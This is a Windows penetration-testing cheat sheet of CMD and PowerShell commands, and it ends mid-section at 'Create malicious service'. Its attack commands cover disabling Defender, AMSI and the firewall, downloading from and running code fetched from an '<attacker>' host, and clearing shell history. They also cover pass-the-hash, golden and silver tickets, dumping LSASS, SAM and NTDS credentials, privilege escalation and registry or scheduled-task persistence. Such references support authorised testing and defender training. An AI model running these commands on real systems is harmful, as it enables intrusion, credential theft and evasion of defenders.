---
title: "Windows CMD & PowerShell"
description: "Windows pentest command reference: recon, users/groups, networking, downloads and PowerShell one-liners."
category: tools
tags: [windows, post-exploitation, commands]
tools: [cmd, PowerShell]
difficulty: intermediate
updated: "2026-08-09"
source: "vault:Tools/CMD-Powershell Cheat Sheet.md"
---

# Windows CMD & PowerShell

#Pentesting #PowerShell #CommandLine #CMD 

# Windows Penetration Testing Cheat Sheet

## 1. CMD.exe & PowerShell Pentest Basics

### System Enumeration

| Purpose | CMD | PowerShell |
|---|---|---|
| Current User | `whoami /all` | `[Security.Principal.WindowsIdentity]::GetCurrent()` |
| Local Users | `net user` | `Get-LocalUser` |
| Local Groups | `net localgroup` | `Get-LocalGroup` |
| Local Admins | `net localgroup Administrators` | `Get-LocalGroupMember -Group "Administrators"` |
| Domain Users | `net user /domain` | `Get-ADUser -Filter *` |
| Domain Admins | `net group "Domain Admins" /domain` | `Get-ADGroupMember -Identity "Domain Admins"` |
| Domain Info | `systeminfo \| findstr /B /C:"Domain"` | `Get-ADDomain` |
| Domain Controllers | `nltest /dclist:%USERDOMAIN%` | `Get-ADDomainController -Filter *` |
| Hostname | `hostname` | `$env:COMPUTERNAME` |
| OS Info | `systeminfo` | `Get-CimInstance Win32_OperatingSystem` |

### Network Enumeration

```cmd
:: Active connections
netstat -ano

:: Routing table
route print

:: ARP cache
arp -a

:: DNS cache
ipconfig /displaydns

:: Network shares (local)
net share

:: Network shares (remote)
net view \\<target>

:: Domain computers
net view /domain

:: Current sessions
net session
```

```powershell
# Active TCP connections with process
Get-NetTCPConnection | Select LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess

# SMB shares on remote host
Get-SmbShare -CimSession <target>

# Port scan (single port)
Test-NetConnection -ComputerName <target> -Port 445

# Quick port sweep
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<target>",$_)) "Port $_ open"} 2>$null
```

### Process & Service Enumeration

```cmd
:: Running processes
tasklist /v
wmic process list full

:: Services
sc query
wmic service get name,displayname,pathname,startmode

:: Unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```powershell
# Processes with path
Get-Process | Select Name,Id,Path

# Services with binary paths
Get-WmiObject win32_service | Select Name,PathName,StartMode,State

# Find unquoted service paths
Get-WmiObject win32_service | Where {$_.PathName -notlike "C:\Windows\*" -and $_.PathName -notlike '"*'} | Select Name,PathName
```

### Firewall & Defender Manipulation

```cmd
:: Firewall status
netsh advfirewall show allprofiles

:: Disable firewall (requires admin)
netsh advfirewall set allprofiles state off

:: Add firewall rule
netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=tcp localport=4444

:: Defender status
sc query windefend

:: Disable real-time monitoring (requires admin)
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"

:: Add exclusion path
powershell -c "Add-MpPreference -ExclusionPath 'C:\Tools'"
```

```powershell
# Defender status
Get-MpComputerStatus

# Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Add exclusions
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionProcess "payload.exe"
Add-MpPreference -ExclusionExtension ".ps1"

# List exclusions
Get-MpPreference | Select Exclusion*

# Disable AMSI (current session)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### File Transfer Techniques

```cmd
:: Certutil download
certutil -urlcache -split -f http://<attacker>/file.exe C:\Temp\file.exe

:: Certutil base64 decode
certutil -decode encoded.txt decoded.exe

:: Bitsadmin download
bitsadmin /transfer job /download /priority high http://<attacker>/file.exe C:\Temp\file.exe

:: PowerShell via CMD
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<attacker>/file.exe','C:\Temp\file.exe')"

:: Curl (Windows 10+)
curl http://<attacker>/file.exe -o C:\Temp\file.exe
```

```powershell
# Invoke-WebRequest
Invoke-WebRequest -Uri "http://<attacker>/file.exe" -OutFile "C:\Temp\file.exe"
iwr "http://<attacker>/file.exe" -o "C:\Temp\file.exe"

# WebClient
(New-Object Net.WebClient).DownloadFile("http://<attacker>/file.exe","C:\Temp\file.exe")

# Download and execute in memory (fileless)
IEX (New-Object Net.WebClient).DownloadString("http://<attacker>/script.ps1")
IEX (iwr "http://<attacker>/script.ps1" -UseBasicParsing).Content

# SMB copy
copy \\<attacker>\share\file.exe C:\Temp\file.exe

# Base64 encode/decode
$content = Get-Content -Path "file.exe" -Encoding Byte
[Convert]::ToBase64String($content) | Out-File encoded.txt

[IO.File]::WriteAllBytes("decoded.exe", [Convert]::FromBase64String((Get-Content encoded.txt)))
```

---

## 2. Sensitive File Locations

## PowerShell & CMD History Locations

### PowerShell History

| Location | Description |
|---|---|
| `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | PSReadLine history (PS 5.0+) |
| `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | Full path |
| `(Get-PSReadLineOption).HistorySavePath` | Query current history path |

```powershell
# Read current user's PowerShell history
Get-Content (Get-PSReadLineOption).HistorySavePath

# Read all users' history (requires admin)
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | ForEach-Object { Write-Host "`n=== $($_.FullName) ==="; Get-Content $_ }

# Search history for sensitive strings
Select-String -Path (Get-PSReadLineOption).HistorySavePath -Pattern "password|credential|secret|key"
```

```cmd
:: CMD access to PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

:: All users
for /f "tokens=*" %a in ('dir /b C:\Users') do @type "C:\Users\%a\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
```

### CMD History

CMD does not persist history to disk by default. History exists only in memory during the session.

```cmd
:: View current session history
doskey /history

:: Save current session to file
doskey /history > C:\Temp\cmd_history.txt
```

### PowerShell Transcript Logs

| Location | Description |
|---|---|
| `C:\Users\<user>\Documents\PowerShell_transcript*.txt` | Default transcript location |
| `C:\Transcripts\` | Common GPO-configured location |
| Registry: `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription` | Check if enabled |

```powershell
# Check if transcription is enabled
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue

# Find transcript files
Get-ChildItem -Path C:\ -Recurse -Include "*transcript*" -ErrorAction SilentlyContinue

# Common locations
Get-ChildItem -Path "C:\Transcripts" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*transcript*" -ErrorAction SilentlyContinue
```

### PowerShell Event Logs

| Log Path | Description |
|---|---|
| `Microsoft-Windows-PowerShell/Operational` | Script block logging, module logging |
| `Windows PowerShell` | Legacy PowerShell log |

```powershell
# Query PowerShell script block logs (Event ID 4104)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath '*[System[EventID=4104]]' -MaxEvents 50 | Format-List Message

# Export PowerShell logs
wevtutil qe "Microsoft-Windows-PowerShell/Operational" /f:text > ps_logs.txt
```

### Cleanup Commands

```powershell
# Clear PowerShell history
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force

# Clear current session history
Clear-History

# Disable history for current session
Set-PSReadLineOption -HistorySaveStyle SaveNothing
```

```cmd
:: Clear CMD session history
doskey /reinstall
```


### Windows Credentials & Hives

| Path | Description |
|---|---|
| `C:\Windows\System32\config\SAM` | Local account password hashes |
| `C:\Windows\System32\config\SYSTEM` | System key for SAM decryption |
| `C:\Windows\System32\config\SECURITY` | LSA secrets, cached domain creds |
| `C:\Windows\NTDS\ntds.dit` | AD database (Domain Controllers) |
| `C:\Windows\repair\SAM` | Backup SAM (older systems) |
| `C:\Windows\repair\SYSTEM` | Backup SYSTEM hive |
| `%USERPROFILE%\NTUSER.DAT` | User registry hive |

### Unattended Installation Files

| Path | Description |
|---|---|
| `C:\Unattend.xml` | Unattended setup file |
| `C:\Windows\Panther\Unattend.xml` | Setup answer file |
| `C:\Windows\Panther\Unattend\Unattend.xml` | Alternate location |
| `C:\Windows\System32\sysprep\sysprep.xml` | Sysprep config |
| `C:\Windows\System32\sysprep\Panther\unattend.xml` | Sysprep unattend |
| `C:\sysprep.inf` | Legacy sysprep |
| `C:\sysprep\sysprep.xml` | Legacy sysprep XML |

### Web Application Configs

| Path | Description |
|---|---|
| `C:\inetpub\wwwroot\web.config` | IIS web application config |
| `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config` | .NET machine config |
| `C:\inetpub\wwwroot\*\connectionStrings.config` | Database connection strings |
| `%WINDIR%\system32\inetsrv\config\applicationHost.config` | IIS host config |

### Common Credential Locations

| Path | Description |
|---|---|
| `%APPDATA%\Microsoft\Credentials\*` | Windows Credential Manager |
| `%LOCALAPPDATA%\Microsoft\Credentials\*` | Local credential vault |
| `%USERPROFILE%\.aws\credentials` | AWS credentials |
| `%USERPROFILE%\.azure\accessTokens.json` | Azure tokens |
| `%USERPROFILE%\.kube\config` | Kubernetes config |
| `C:\ProgramData\McAfee\Agent\DB\ma.db` | McAfee ePO credentials |
| `C:\Users\*\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings` | RDCMan encrypted creds |
| `C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml` | FileZilla saved credentials |
| `C:\Users\*\AppData\Roaming\FileZilla\sitemanager.xml` | FileZilla site manager |

### Group Policy Preferences

| Path | Description |
|---|---|
| `\\<domain>\SYSVOL\<domain>\Policies\*\Machine\Preferences\Groups\Groups.xml` | GPP local group creds |
| `\\<domain>\SYSVOL\<domain>\Policies\*\Machine\Preferences\Services\Services.xml` | GPP service accounts |
| `\\<domain>\SYSVOL\<domain>\Policies\*\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml` | GPP scheduled tasks |
| `\\<domain>\SYSVOL\<domain>\Policies\*\Machine\Preferences\DataSources\DataSources.xml` | GPP data sources |

```powershell
# Search for GPP passwords in SYSVOL
Get-ChildItem -Path "\\$env:USERDNSDOMAIN\SYSVOL" -Recurse -Include *.xml -ErrorAction SilentlyContinue | Select-String -Pattern "cpassword"
```

### Quick File Search Commands

```cmd
:: Find files containing "password"
findstr /si password *.txt *.ini *.config *.xml

:: Find specific files recursively
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml C:\*web.config 2>nul
```

```powershell
# Search for password in files
Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.ini,*.config,*.xml -ErrorAction SilentlyContinue | Select-String -Pattern "password" -List

# Find interesting files
Get-ChildItem -Path C:\ -Recurse -Include *pass*,*cred*,*vnc*,*.config -ErrorAction SilentlyContinue
```

---

## 3. Impersonation & Lateral Movement (Cleartext Credentials)

### CMD - runas

```cmd
:: Interactive login as another user (spawns new cmd)
runas /user:<domain>\<username> cmd.exe

:: Run specific command
runas /user:<domain>\<username> "powershell.exe -ep bypass"

:: Network-only impersonation (no local profile, creds used for network resources only)
runas /netonly /user:<domain>\<username> cmd.exe

:: Useful for accessing remote shares/services without touching local system
runas /netonly /user:CORP\admin "mmc.exe"
```

### PowerShell - PSCredential Object

```powershell
# Create credential object
$user = "<domain>\<username>"
$pass = ConvertTo-SecureString "<password>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)

# Alternative: Prompt for credentials
$cred = Get-Credential
```

### PowerShell - Remote Execution with Invoke-Command

```powershell
# Single command on remote host
Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {whoami; hostname}

# Execute local script on remote host
Invoke-Command -ComputerName <target> -Credential $cred -FilePath C:\Scripts\payload.ps1

# Multiple targets
Invoke-Command -ComputerName server1,server2,server3 -Credential $cred -ScriptBlock {Get-Process}

# With session for persistence
$session = New-PSSession -ComputerName <target> -Credential $cred
Invoke-Command -Session $session -ScriptBlock {whoami}
Remove-PSSession $session
```

### PowerShell - Interactive Session with Enter-PSSession

```powershell
# Interactive PowerShell session
Enter-PSSession -ComputerName <target> -Credential $cred

# When inside remote session
[<target>]: PS C:\> whoami
[<target>]: PS C:\> exit

# Using SSL (if configured)
Enter-PSSession -ComputerName <target> -Credential $cred -UseSSL
```

### PowerShell - Start-Process as Different User

```powershell
# Start process as another user (local)
Start-Process -FilePath "cmd.exe" -Credential $cred

# Start process with arguments
Start-Process -FilePath "powershell.exe" -ArgumentList "-ep bypass -File C:\script.ps1" -Credential $cred

# Start hidden process
Start-Process -FilePath "powershell.exe" -ArgumentList "-ep bypass -c IEX(...)" -Credential $cred -WindowStyle Hidden
```

### WMI Remote Execution

```powershell
# Execute command via WMI
Invoke-WmiMethod -ComputerName <target> -Credential $cred -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\output.txt"

# Using CIM (modern)
Invoke-CimMethod -ComputerName <target> -Credential $cred -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell.exe -ep bypass -c IEX(...)"}
```

### PsExec-style Execution

```cmd
:: Sysinternals PsExec
psexec.exe \\<target> -u <domain>\<username> -p <password> cmd.exe

:: Interactive session
psexec.exe \\<target> -u <domain>\<username> -p <password> -i cmd.exe

:: Run as SYSTEM
psexec.exe \\<target> -u <domain>\<username> -p <password> -s cmd.exe
```

---

## 4. Pass-the-Hash (PtH) Techniques

### Technical Overview

Native Windows commands do not accept NTLM hashes directly. PtH requires injecting the hash into memory (LSASS) or using tools that implement the NTLM authentication protocol directly. The hash replaces the password in the NTLM challenge-response flow.

**NTLM Hash Format:** `LMHash:NTHash` or `aad3b435b51404eeaad3b435b51404ee:NTHashHere` (empty LM)

### Mimikatz - sekurlsa::pth

```cmd
:: Pass-the-Hash - spawns new process with injected credentials
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTHash> /run:cmd.exe" "exit"

:: Example
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:a87f3a337d73085c45f9416be5787d86 /run:powershell.exe" "exit"

:: With AES256 key (more stealthy, Kerberos)
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:CORP /aes256:<aes256key> /run:cmd.exe" "exit"
```

### Impacket Tools (via CMD/PowerShell)

```bash
# PsExec with hash
impacket-psexec <domain>/<username>@<target> -hashes <LMHash>:<NTHash>
impacket-psexec CORP/Administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86

# WMIExec with hash
impacket-wmiexec <domain>/<username>@<target> -hashes <LMHash>:<NTHash>

# SMBExec with hash
impacket-smbexec <domain>/<username>@<target> -hashes <LMHash>:<NTHash>

# Atexec with hash (scheduled task)
impacket-atexec <domain>/<username>@<target> -hashes <LMHash>:<NTHash> "whoami"

# SecretsDump - extract hashes
impacket-secretsdump <domain>/<username>@<target> -hashes <LMHash>:<NTHash>
```

### CrackMapExec / NetExec

```bash
# Command execution with hash
crackmapexec smb <target> -u <username> -H <NTHash> -x "whoami"

# PowerShell execution
crackmapexec smb <target> -u <username> -H <NTHash> -X "Get-Process"

# Dump SAM
crackmapexec smb <target> -u <username> -H <NTHash> --sam

# Dump LSA
crackmapexec smb <target> -u <username> -H <NTHash> --lsa

# NetExec (modern fork)
nxc smb <target> -u <username> -H <NTHash> -x "whoami"
```

### Invoke-TheHash (PowerShell)

```powershell
# Import module
Import-Module .\Invoke-TheHash.psd1

# WMI execution
Invoke-WMIExec -Target <target> -Domain <domain> -Username <username> -Hash <NTHash> -Command "cmd.exe /c whoami > C:\output.txt"

# SMB execution
Invoke-SMBExec -Target <target> -Domain <domain> -Username <username> -Hash <NTHash> -Command "powershell -ep bypass -c IEX(...)"

# SMB client for file operations
Invoke-SMBClient -Target <target> -Domain <domain> -Username <username> -Hash <NTHash> -Action Get -Source "C$\Windows\System32\config\SAM"
```

### Evil-WinRM

```bash
# PtH with Evil-WinRM
evil-winrm -i <target> -u <username> -H <NTHash>

# With SSL
evil-winrm -i <target> -u <username> -H <NTHash> -S
```

### xfreerdp (RDP with Hash - Restricted Admin Mode Required)

```bash
# RDP Pass-the-Hash (target must have Restricted Admin enabled)
xfreerdp /v:<target> /u:<username> /pth:<NTHash> /d:<domain>

# Enable Restricted Admin on target (requires prior access)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

### Overpass-the-Hash (Request Kerberos TGT with Hash)

```cmd
:: Mimikatz - Request TGT using hash, then use Kerberos
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTHash> /run:powershell.exe" "exit"

:: In spawned shell, Kerberos ticket is obtained automatically on network access
:: Verify with:
klist
```

```powershell
# Rubeus - Overpass-the-Hash
.\Rubeus.exe asktgt /user:<username> /domain:<domain> /rc4:<NTHash> /ptt

# With AES256 (opsec-safer)
.\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes256key> /ptt

# Verify ticket
klist
```


---

## 5. Kerberos Attacks

### Kerberoasting

```powershell
# PowerShell - Request TGS for SPNs (no tools)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.corp.local:1433"

# Extract tickets from memory
Get-ChildItem C:\Users\*\AppData\Local\Temp\*.kirbi

# PowerView - Find Kerberoastable accounts
Get-DomainUser -SPN | Select SamAccountName,ServicePrincipalName
```

```cmd
:: Rubeus - Kerberoast all SPNs
Rubeus.exe kerberoast /outfile:hashes.txt

:: Kerberoast specific user
Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt

:: With AES (opsec-safer, RC4 is default)
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt
```

```bash
# Impacket - Remote Kerberoasting
impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <dc-ip> -request -outputfile hashes.txt

# With hash
impacket-GetUserSPNs <domain>/<username> -hashes <LMHash>:<NTHash> -dc-ip <dc-ip> -request
```

### AS-REP Roasting

```powershell
# PowerView - Find AS-REP Roastable users (DONT_REQ_PREAUTH)
Get-DomainUser -PreauthNotRequired | Select SamAccountName
```

```cmd
:: Rubeus - AS-REP Roast
Rubeus.exe asreproast /outfile:hashes.txt

:: Specific user
Rubeus.exe asreproast /user:svc_backup /outfile:hash.txt
```

```bash
# Impacket - Remote AS-REP Roasting
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip> -outputfile hashes.txt

# Authenticated
impacket-GetNPUsers <domain>/<username>:<password> -dc-ip <dc-ip> -request
```

### Golden Ticket

```cmd
:: Mimikatz - Create Golden Ticket (requires krbtgt hash)
mimikatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-SID> /krbtgt:<krbtgt-NTHash> /ptt" "exit"

:: With specific groups (Domain Admins, Enterprise Admins, Schema Admins)
mimikatz.exe "kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /groups:512,518,519 /ptt" "exit"

:: Export to file instead of inject
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:golden.kirbi" "exit"
```

```bash
# Impacket - Golden Ticket
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <domain-SID> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec <domain>/Administrator@<target> -k -no-pass
```

### Silver Ticket

```cmd
:: Mimikatz - Create Silver Ticket (requires service account hash)
:: CIFS service (file shares)
mimikatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-SID> /target:<target-fqdn> /service:cifs /rc4:<service-account-hash> /ptt" "exit"

:: HTTP service
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:web.corp.local /service:http /rc4:<hash> /ptt" "exit"

:: MSSQL service
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:sql.corp.local /service:MSSQLSvc /rc4:<hash> /ptt" "exit"
```

### Ticket Management

```cmd
:: List current tickets
klist

:: Purge all tickets
klist purge

:: Mimikatz - Export tickets
mimikatz.exe "sekurlsa::tickets /export" "exit"

:: Mimikatz - Import ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

:: Rubeus - Import ticket
Rubeus.exe ptt /ticket:ticket.kirbi

:: Rubeus - Dump tickets
Rubeus.exe dump
Rubeus.exe triage
```

---

## 6. Credential Dumping

### LSASS Dumping

```cmd
:: Task Manager (manual): Right-click lsass.exe > Create dump file

:: ProcDump (Sysinternals)
procdump.exe -ma lsass.exe lsass.dmp

:: Mimikatz - Direct dump
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

:: Mimikatz - From dump file
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

:: comsvcs.dll (native LOLBin)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-PID> C:\Temp\lsass.dmp full
```

```powershell
# Get LSASS PID
Get-Process lsass | Select Id

# Out-Minidump (PowerSploit)
Get-Process lsass | Out-Minidump

# Using comsvcs.dll
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\Temp\lsass.dmp full
```

### SAM/SYSTEM/SECURITY Extraction

```cmd
:: Save hives (requires admin)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

:: Copy from Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

```bash
# Impacket - Extract hashes from hives
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Remote extraction
impacket-secretsdump <domain>/<username>:<password>@<target>
impacket-secretsdump <domain>/<username>@<target> -hashes <LMHash>:<NTHash>
```

### NTDS.dit Extraction (Domain Controller)

```cmd
:: Using ntdsutil
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" quit quit

:: Using vssadmin
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

:: Mimikatz DCSync (no need for file access)
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" "exit"
mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" "exit"
```

```bash
# Impacket - Remote DCSync
impacket-secretsdump <domain>/<username>:<password>@<dc-ip> -just-dc

# Extract NTDS.dit locally
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -outputfile hashes
```

### Cached Credentials

```cmd
:: Mimikatz - Cached domain credentials (DCC2/mscash2)
mimikatz.exe "lsadump::cache" "exit"

:: From SECURITY hive
mimikatz.exe "lsadump::secrets" "exit"
```

### Windows Credential Manager

```cmd
:: List stored credentials
cmdkey /list

:: Mimikatz - Dump vault credentials
mimikatz.exe "vault::cred /patch" "exit"

:: PowerShell
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ }
```

---

## 7. Privilege Escalation Enumeration

### Automated Enumeration

```cmd
:: WinPEAS
winpeasany.exe quiet

:: Seatbelt
Seatbelt.exe -group=all

:: PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

:: SharpUp
SharpUp.exe audit
```

### Token Privileges

```cmd
:: Check current privileges
whoami /priv
```

| Privilege | Exploitation Technique |
|---|---|
| `SeImpersonatePrivilege` | Potato attacks (JuicyPotato, PrintSpoofer, GodPotato) |
| `SeAssignPrimaryTokenPrivilege` | Token impersonation |
| `SeBackupPrivilege` | Read any file (SAM, NTDS.dit) |
| `SeRestorePrivilege` | Write any file, DLL hijack |
| `SeTakeOwnershipPrivilege` | Take ownership of any object |
| `SeDebugPrivilege` | Debug any process, inject into LSASS |
| `SeLoadDriverPrivilege` | Load malicious kernel driver |

### Potato Attacks (SeImpersonatePrivilege)

```cmd
:: PrintSpoofer (Windows 10/Server 2016+)
PrintSpoofer.exe -i -c cmd.exe

:: GodPotato (universal)
GodPotato.exe -cmd "cmd /c whoami"

:: JuicyPotato (older systems)
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

:: SweetPotato
SweetPotato.exe -p cmd.exe -a "/c whoami"
```

### Service Exploitation

```cmd
:: Unquoted service path exploitation
:: 1. Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: 2. Check write permissions to path
icacls "C:\Program Files\Vulnerable Service"

:: 3. Drop binary and restart service
copy payload.exe "C:\Program Files\Vulnerable.exe"
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

```cmd
:: Weak service permissions
:: 1. Check service permissions
sc sdshow <service>
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

:: 2. Modify service binary path
sc config <service> binpath= "C:\Temp\payload.exe"
sc stop <service>
sc start <service>
```

### AlwaysInstallElevated

```cmd
:: Check if enabled
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: Exploit with MSI payload
msiexec /quiet /qn /i malicious.msi
```

### Scheduled Tasks

```powershell
# Find writable scheduled task binaries
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $actions = $task.Actions
    foreach ($action in $actions) {
        if ($action.Execute) {
            $path = $action.Execute
            if (Test-Path $path) {
                $acl = Get-Acl $path
                [PSCustomObject]@{
                    TaskName = $task.TaskName
                    Path = $path
                    Owner = $acl.Owner
                }
            }
        }
    }
}
```

---

## 8. Active Directory Enumeration

### PowerView Commands

```powershell
# Import PowerView
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController

# Users
Get-DomainUser | Select SamAccountName,Description
Get-DomainUser -AdminCount | Select SamAccountName
Get-DomainUser -SPN | Select SamAccountName,ServicePrincipalName

# Groups
Get-DomainGroup | Select SamAccountName
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Computers
Get-DomainComputer | Select DnsHostName,OperatingSystem
Get-DomainComputer -Unconstrained | Select DnsHostName

# GPOs
Get-DomainGPO | Select DisplayName,GPCFileSysPath

# ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# Shares
Find-DomainShare -CheckShareAccess

# Sessions
Get-NetSession -ComputerName <target>
Get-NetLoggedOn -ComputerName <target>

# Trust relationships
Get-DomainTrust
Get-ForestTrust
```

### BloodHound Collection

```cmd
:: SharpHound - Collector
SharpHound.exe -c All
SharpHound.exe -c All,GPOLocalGroup --zipfilename bloodhound.zip

:: Stealth collection
SharpHound.exe -c DCOnly --stealth
```

```powershell
# PowerShell collector
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp
```

### LDAP Queries (Native PowerShell)

```powershell
# All domain users
$searcher = [adsisearcher]"(&(objectClass=user)(objectCategory=person))"
$searcher.FindAll() | % { $_.Properties.samaccountname }

# Domain Admins members
$searcher = [adsisearcher]"(&(objectClass=group)(cn=Domain Admins))"
$searcher.FindOne().Properties.member

# Computers with unconstrained delegation
$searcher = [adsisearcher]"(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
$searcher.FindAll() | % { $_.Properties.dnshostname }

# Users with SPN set (Kerberoastable)
$searcher = [adsisearcher]"(&(objectClass=user)(servicePrincipalName=*))"
$searcher.FindAll() | % { $_.Properties.samaccountname }

# Users with PreAuth disabled (AS-REP Roastable)
$searcher = [adsisearcher]"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$searcher.FindAll() | % { $_.Properties.samaccountname }
```

---

## 9. Persistence Mechanisms

### Registry Run Keys

```cmd
:: Current user persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Temp\payload.exe" /f

:: All users persistence (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Temp\payload.exe" /f

:: RunOnce (executes once then deletes)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Updater /t REG_SZ /d "C:\Temp\payload.exe" /f
```

### Scheduled Tasks

```cmd
:: Create scheduled task
schtasks /create /tn "Updater" /tr "C:\Temp\payload.exe" /sc onlogon /ru SYSTEM

:: At startup
schtasks /create /tn "Updater" /tr "C:\Temp\payload.exe" /sc onstart /ru SYSTEM

:: Every hour
schtasks /create /tn "Updater" /tr "C:\Temp\payload.exe" /sc hourly /ru SYSTEM

:: Query tasks
schtasks /query /tn "Updater" /v /fo list
```

```powershell
$action = New-ScheduledTaskAction -Execute "C:\Temp\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger -Principal $principal
```

### Services

```cmd
:: Create malicious service
